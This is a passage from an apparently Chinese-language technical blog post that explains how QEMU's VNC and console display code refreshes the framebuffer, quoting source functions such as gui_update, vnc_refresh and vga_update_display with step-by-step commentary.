<span class="hljs-comment">/* Make a local copy of vs and switch output buffers */</span><br>    vnc_async_encoding_start(job-&gt;vs, &amp;vs);<br>    vs.magic = VNC_MAGIC;<br><br>    <span class="hljs-comment">/* Start sending rectangles */</span><br>    n_rectangles = <span class="hljs-number">0</span>;<br>    vnc_write_u8(&amp;vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);<br>    vnc_write_u8(&amp;vs, <span class="hljs-number">0</span>);<br>    saved_offset = vs.output.offset;<br>    vnc_write_u16(&amp;vs, <span class="hljs-number">0</span>);<br><br>    vnc_lock_display(job-&gt;vs-&gt;vd);<br>    <span class="hljs-comment">// 遍历该 job 上的 VncRect，发送给 client</span><br>    QLIST_FOREACH_SAFE(entry, &amp;job-&gt;rectangles, next, tmp) &#123;<br>        <span class="hljs-type">int</span> n;<br><br>        <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// io channel 为空，断开连接</span><br>            vnc_unlock_display(job-&gt;vs-&gt;vd);<br>            <span class="hljs-comment">/* Copy persistent encoding data */</span><br>            vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>            <span class="hljs-keyword">goto</span> disconnected;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vnc_worker_clamp_rect(&amp;vs, job, &amp;entry-&gt;rect)) &#123;<br>            <span class="hljs-comment">// 发送 buffer</span><br>            n = vnc_send_framebuffer_update(&amp;vs, entry-&gt;rect.x, entry-&gt;rect.y,<br>                                            entry-&gt;rect.w, entry-&gt;rect.h);<br><br>            <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">0</span>) &#123;<br>                n_rectangles += n;<br>            &#125;<br>        &#125;<br>        g_free(entry);<br>    &#125;<br>    trace_vnc_job_nrects(&amp;vs, job, n_rectangles);<br>    vnc_unlock_display(job-&gt;vs-&gt;vd);<br><br>    <span class="hljs-comment">/* Put n_rectangles at the beginning of the message */</span><br>    vs.output.buffer[saved_offset] = (n_rectangles &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    vs.output.buffer[saved_offset + <span class="hljs-number">1</span>] = n_rectangles &amp; <span class="hljs-number">0xFF</span>;<br><br>    vnc_lock_output(job-&gt;vs);<br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc != <span class="hljs-literal">NULL</span>) &#123;<br>        buffer_move(&amp;job-&gt;vs-&gt;jobs_buffer, &amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br><br>        qemu_bh_schedule(job-&gt;vs-&gt;bh);<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>        buffer_reset(&amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>disconnected:<br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);<br>    QTAILQ_REMOVE(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs, job, next);<br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    qemu_cond_broadcast(&amp;<span class="hljs-built_in">queue</span>-&gt;cond);<br>    g_free(job);<br>    vs.magic = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数的流程如下：</p><ul><li>检查全局 queue 的 job 链表是否为空，若是则进入睡眠等待</li><li>锁上第一个 job，检查对应 VncState 的 IO channel 是否为空，若是则跳到结束发送</li><li>若 VncState 的 output buffer （Buffer 类型，类似于 iovec，有长度和指向实际 buffer 的指针）的 offset 为 0，则将其给到函数内临时创建的 VncState 的 output buffer，原 buffer 设为 NULL</li><li>遍历该 job 上的 VncRect，发送给 client，若 io channel 为空，则跳到结束发送</li><li>若 VncState 的 io channel 不为空，则将函数内临时创建的 VncState 的 output buffer 给回原 VncState</li><li>（结束发送）从全局 queue 上取下该 job 并释放</li></ul><h3 id="II、VNC-的-dcl-ops"><a href="#II、VNC-的-dcl-ops" class="headerlink" title="II、VNC 的 dcl_ops"></a>II、VNC 的 dcl_ops</h3><p>在 <code>vnc_display_init()</code> 中创建 VncDisplay 实例时会将其 DisplayChangeListener 的函数表初始化为 <code>dcl_ops</code> 函数表，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> DisplayChangeListenerOps dcl_ops = &#123;<br>    .dpy_name             = <span class="hljs-string">&quot;vnc&quot;</span>,<br>    .dpy_refresh          = vnc_refresh,<br>    .dpy_gfx_update       = vnc_dpy_update,<br>    .dpy_gfx_switch       = vnc_dpy_switch,<br>    .dpy_gfx_check_format = qemu_pixman_check_format,<br>    .dpy_mouse_set        = vnc_mouse_set,<br>    .dpy_cursor_define    = vnc_dpy_cursor_define,<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到的是其中主要都是与 vnc 相关的操作函数，后面涉及到具体函数时我们再展开分析</p><h3 id="III、register-displaychangelistener-注册-dcl，启动-timer"><a href="#III、register-displaychangelistener-注册-dcl，启动-timer" class="headerlink" title="III、register_displaychangelistener - 注册 dcl，启动 timer"></a>III、register_displaychangelistener - 注册 dcl，启动 timer</h3><p>该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_displaychangelistener</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    QemuConsole *con;<br><br>    assert(!dcl-&gt;ds);<br><br>    trace_displaychangelistener_register(dcl, dcl-&gt;ops-&gt;dpy_name);<br>    dcl-&gt;ds = get_alloc_displaystate();<br>    QLIST_INSERT_HEAD(&amp;dcl-&gt;ds-&gt;listeners, dcl, next);<br>    gui_setup_refresh(dcl-&gt;ds);<br>    <span class="hljs-keyword">if</span> (dcl-&gt;con) &#123;<br>        dcl-&gt;con-&gt;dcls++;<br>        con = dcl-&gt;con;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        con = active_console;<br>    &#125;<br>    displaychangelistener_display_console(dcl, con, dcl-&gt;con ? &amp;error_fatal : <span class="hljs-literal">NULL</span>);<br>    text_console_update_cursor(<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要做了这些事情：</p><ul><li>将 dcl 插到对应 DisplayState 的 listeners 链表上</li><li>调用 <code>gui_setup_refresh()</code> 启动一个 Qemu Timer</li><li>调用 <code>displaychangelistener_display_console()</code> 进行相关初始化操作，其中会调用 <code>dcl-&gt;ops</code> 中函数</li></ul><p>我们主要关注 <code>gui_setup_refresh()</code>，其会启动一个 Qemu 定时器，定期地刷新 frame buffer，这也是更新显卡数据的核心：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_setup_refresh</span><span class="hljs-params">(DisplayState *ds)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">bool</span> need_timer = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_gfx = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_text = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh != <span class="hljs-literal">NULL</span>) &#123;<br>            need_timer = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_gfx = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_text_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_text = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (need_timer &amp;&amp; ds-&gt;gui_timer == <span class="hljs-literal">NULL</span>) &#123;<br>        ds-&gt;gui_timer = timer_new_ms(QEMU_CLOCK_REALTIME, gui_update, ds);<br>        timer_mod(ds-&gt;gui_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!need_timer &amp;&amp; ds-&gt;gui_timer != <span class="hljs-literal">NULL</span>) &#123;<br>        timer_free(ds-&gt;gui_timer);<br>        ds-&gt;gui_timer = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    ds-&gt;have_gfx = have_gfx;<br>    ds-&gt;have_text = have_text;<br>&#125;<br></code></pre></td></tr></table></figure><p>当 dcl-&gt;ops 的 <code>dpy_refresh</code> 指针非空<strong>且当前 DisplayState 未设置 timer 时</strong>，便会调用 <code>timer_new_ms()</code> 新建一个毫秒级别的定时器，定时调用 <code>gui_update()</code> 刷新显存，接收的参数便为该 DisplayState</p><h1 id="0x03-显示设备更新相关函数"><a href="#0x03-显示设备更新相关函数" class="headerlink" title="0x03.显示设备更新相关函数"></a>0x03.显示设备更新相关函数</h1><p>前面我们讲到，在 Qemu 启动时会启动一个 Timer 定时进行显存的刷新，其代码调用关系如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p><h2 id="一、gui-update-timer-定时调用进行更新操作"><a href="#一、gui-update-timer-定时调用进行更新操作" class="headerlink" title="一、gui_update - timer 定时调用进行更新操作"></a>一、gui_update - timer 定时调用进行更新操作</h2><p>我们先来看 <code>gui_update()</code> 这个由 timer 定时调用的函数，其定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_update</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> interval = GUI_REFRESH_INTERVAL_IDLE;<br>    <span class="hljs-type">uint64_t</span> dcl_interval;<br>    DisplayState *ds = opaque;<br>    DisplayChangeListener *dcl;<br>    QemuConsole *con;<br><br>    ds-&gt;refreshing = <span class="hljs-literal">true</span>;<br>    dpy_refresh(ds);<br>    ds-&gt;refreshing = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        dcl_interval = dcl-&gt;update_interval ?<br>            dcl-&gt;update_interval : GUI_REFRESH_INTERVAL_DEFAULT;<br>        <span class="hljs-keyword">if</span> (interval &gt; dcl_interval) &#123;<br>            interval = dcl_interval;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ds-&gt;update_interval != interval) &#123;<br>        ds-&gt;update_interval = interval;<br>        QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>            <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;update_interval) &#123;<br>                con-&gt;hw_ops-&gt;update_interval(con-&gt;hw, interval);<br>            &#125;<br>        &#125;<br>        trace_console_refresh(interval);<br>    &#125;<br>    ds-&gt;last_update = qemu_clock_get_ms(QEMU_CLOCK_REALTIME);<br>    timer_mod(ds-&gt;gui_timer, ds-&gt;last_update + interval);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要流程如下：</p><ul><li>调用 <code>dpy_refresh()</code> ，该函数会遍历 DisplayState 中的所有 DisplayChangeListener 并调用 <code>dcl-&gt;ops-&gt;dpy_refresh()</code></li><li>遍历 DisplayState 中的所有 DisplayChangeListener，检查 <code>dcl-&gt;update_interval</code></li><li>若 <code>ds-&gt;update_interval != interval</code>，遍历所有的 QemuConsole 并调用 <code>con-&gt;hw_ops-&gt;update_interval()</code> 进行硬件数据更新</li></ul><h2 id="二、dpy-refresh-遍历-dcl-并调用-dcl-gt-ops-gt-dpy-refresh-进行更新"><a href="#二、dpy-refresh-遍历-dcl-并调用-dcl-gt-ops-gt-dpy-refresh-进行更新" class="headerlink" title="二、dpy_refresh - 遍历 dcl 并调用 dcl-&gt;ops-&gt;dpy_refresh 进行更新"></a>二、dpy_refresh - 遍历 dcl 并调用 dcl-&gt;ops-&gt;dpy_refresh 进行更新</h2><p><code>dpy_refresh()</code> 比较简单，主要就是遍历 DisplayState 中的所有 DisplayChangeListener 并调用 <code>dcl-&gt;ops-&gt;dpy_refresh()</code>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dpy_refresh</span><span class="hljs-params">(DisplayState *s)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br><br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh) &#123;<br>            dcl-&gt;ops-&gt;dpy_refresh(dcl);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们主要关注与 VNC 有关的部分，对于 VNC 而言，其 <code>dcl-&gt;ops-&gt;dpy_refresh</code> 应为 <code>vnc_refresh</code>，该函数定义于 <code>ui/vnc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_refresh</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    VncState *vs, *vn;<br>    <span class="hljs-type">int</span> has_dirty, rects = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (QTAILQ_EMPTY(&amp;vd-&gt;clients)) &#123;   <span class="hljs-comment">// 没有 client，直接返回</span><br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_MAX);   <span class="hljs-comment">//更新计时</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    graphic_hw_update(vd-&gt;dcl.con); <span class="hljs-comment">// 硬件更新</span><br><br>    <span class="hljs-keyword">if</span> (vnc_trylock_display(vd)) &#123;<br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_BASE);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    has_dirty = vnc_refresh_server_surface(vd); <span class="hljs-comment">// 检查是否有待更新数据</span><br>    vnc_unlock_display(vd);<br><br>    QTAILQ_FOREACH_SAFE(vs, &amp;vd-&gt;clients, next, vn) &#123;<br>        rects += vnc_update_client(vs, has_dirty);  <span class="hljs-comment">// 遍历更新 client</span><br>        <span class="hljs-comment">/* vs might be free()ed here */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (has_dirty &amp;&amp; rects) &#123;<br>        vd-&gt;dcl.update_interval /= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &lt; VNC_REFRESH_INTERVAL_BASE) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_BASE;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;dcl.update_interval += VNC_REFRESH_INTERVAL_INC;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &gt; VNC_REFRESH_INTERVAL_MAX) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_MAX;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要流程如下：</p><ul><li>检查是否有连接的客户端，若否则更新计时后直接返回</li><li>调用 <code>graphic_hw_update()</code> 更新 dcl 对应的 QemuConsole 对应的硬件设备</li><li>调用 <code>vnc_refresh_server_surface()</code> 检查是否有 dirty 区域（待更新区域）</li><li>遍历 dcl 上的 client， 调用 <code>vnc_update_client()</code> 创建新的 VncJob 挂载到全局链表上，由 worker thread 进行推送</li></ul><h2 id="三、graphic-hw-update-图形硬件数据更新"><a href="#三、graphic-hw-update-图形硬件数据更新" class="headerlink" title="三、graphic_hw_update - 图形硬件数据更新"></a>三、graphic_hw_update - 图形硬件数据更新</h2><p>前面我们涉及到的都是 console、vnc 这一块的数据更新，并没有触及到实际的硬件方面（qemu 模拟显卡等）的更新，这一块实际的更新是由 <code>graphic_hw_update()</code> 来完成的，该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">graphic_hw_update</span><span class="hljs-params">(QemuConsole *con)</span><br>&#123;<br>    <span class="hljs-type">bool</span> async = <span class="hljs-literal">false</span>;<br>    con = con ? con : active_console;<br>    <span class="hljs-keyword">if</span> (!con) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;gfx_update) &#123;<br>        con-&gt;hw_ops-&gt;gfx_update(con-&gt;hw);<br>        async = con-&gt;hw_ops-&gt;gfx_update_async;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!async) &#123;<br>        graphic_hw_update_done(con);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面我们讲到一个 QemuConsole 对应一个显示设备，因此在 <code>graphic_hw_update()</code> 当中会直接调用 <code>con-&gt;hw_ops-&gt;gfx_update()</code> 来完成硬件方面的数据更新</p><p>如果是纯字符型显示设备，则为 <code>text_console_ops</code>，定义于 <code>ui/console.c</code> 中，该函数表没有 <code>gfx_update</code> 指针，故会直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps text_console_ops = &#123;<br>    .invalidate  = text_console_invalidate,<br>    .text_update = text_console_update,<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于默认的图形化界面，<code>con-&gt;hw-&gt;ops</code> 应为 <code>vga_ops</code>，定义于 <code>hw/display/vga.c</code> 中，其 <code>gfx_update</code> 指针为 <code>vga_update_display</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps vga_ops = &#123;<br>    .invalidate  = vga_invalidate_display,<br>    .gfx_update  = vga_update_display,<br>    .text_update = vga_update_text,<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这里主要是根据指定的硬件决定的，默认的图形界面便是 <code>vga_ops</code>，如果你在启动时指定了一个 QXL 显卡，那么这里就应该是 <code>qxl_ops</code>，最终调用到 <code>qxl_hw_update()</code></p></blockquote><p>该函数定义于 <code>hw/display/vga.c</code> 中，主要作用就是根据显示模式调用不同的更新函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vga_update_display</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    VGACommonState *s = opaque;<br>    DisplaySurface *surface = qemu_console_surface(s-&gt;con);<br>    <span class="hljs-type">int</span> full_update, graphic_mode;<br><br>    qemu_flush_coalesced_mmio_buffer();<br><br>    <span class="hljs-keyword">if</span> (surface_bits_per_pixel(surface) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">/* nothing to do */</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        full_update = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (!(s-&gt;ar_index &amp; <span class="hljs-number">0x20</span>)) &#123;<br>            graphic_mode = GMODE_BLANK;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            graphic_mode = s-&gt;gr[VGA_GFX_MISC] &amp; VGA_GR06_GRAPHICS_MODE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (graphic_mode != s-&gt;graphic_mode) &#123;<br>            s-&gt;graphic_mode = graphic_mode;<br>            s-&gt;cursor_blink_time = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);<br>            full_update = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">switch</span>(graphic_mode) &#123;<br>        <span class="hljs-keyword">case</span> GMODE_TEXT:<br>            vga_draw_text(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_GRAPH:<br>            vga_draw_graphic(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> GMODE_BLANK:<br>        <span class="hljs-keyword">default</span>:<br>            vga_draw_blank(s, full_update);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些 <code>vga_draw_*</code> 函数最后都会调用到 <code>dpy_gfx_update()</code> 将更新推送到显示设备上，其定义于 <code>ui/console.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">dpy_gfx_update</span><span class="hljs-params">(QemuConsole *con, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    DisplayState *s = con-&gt;ds;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">int</span> width = qemu_console_get_width(con, x + w);<br>    <span class="hljs-type">int</span> height = qemu_console_get_height(con, y + h);<br><br>    x = MAX(x, <span class="hljs-number">0</span>);<br>    y = MAX(y, <span class="hljs-number">0</span>);<br>    x = MIN(x, width);<br>    y = MIN(y, height);<br>    w = MIN(w, width - x);<br>    h = MIN(h, height - y);<br><br>    <span class="hljs-keyword">if</span> (!qemu_console_is_visible(con)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    dpy_gfx_update_texture(con, con-&gt;surface, x, y, w, h);<br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (con != (dcl-&gt;con ? dcl-&gt;con : active_console)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update) &#123;<br>            dcl-&gt;ops-&gt;dpy_gfx_update(dcl, x, y, w, h);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要流程如下：</p><ul><li>若 QemuConsole 不可视，直接返回</li><li>调用 <code>dpy_gfx_update_texture()</code>，其最终会调用到 <code>con-&gt;gl-&gt;ops-&gt;dpy_gl_ctx_update_texture()</code>，这一块是与 GL 相关的操作，这里暂且不展开</li><li>遍历 QemuConsole 上的 DisplayChangeListener，调用 <code>dcl-&gt;ops-&gt;dpy_gfx_update()</code>，更新 dcl 对应的 display 设备</li></ul><p>对于 VNC 而言，<code>dcl-&gt;ops-&gt;dpy_gfx_update</code> 指针应为 <code>vnc_dpy_update()</code> 函数，定义于 <code>ui/vnc.c</code> 中，主要就是调用 <code>vnc_set_area_dirty()</code> 将一块区域标记为 dirty：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_dpy_update</span><span class="hljs-params">(DisplayChangeListener *dcl,</span><br><span class="hljs-params">                           <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> *<span class="hljs-title">s</span> =</span> &amp;vd-&gt;guest;<br><br>    vnc_set_area_dirty(s-&gt;dirty, vd, x, y, w, h);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终这些被标记为 dirty 的区域会在 <code>vnc_refresh()</code> 中调用 <code>vnc_refresh_server_surface()</code> 时被进一步处理，在 <code>vnc_update_client()</code> 中变为新的 VncJob 链到全局链表上</p><h2 id="四、vnc-client-update-创建新的-VncJob-挂载到全局链表上"><a href="#四、vnc-client-update-创建新的-VncJob-挂载到全局链表上" 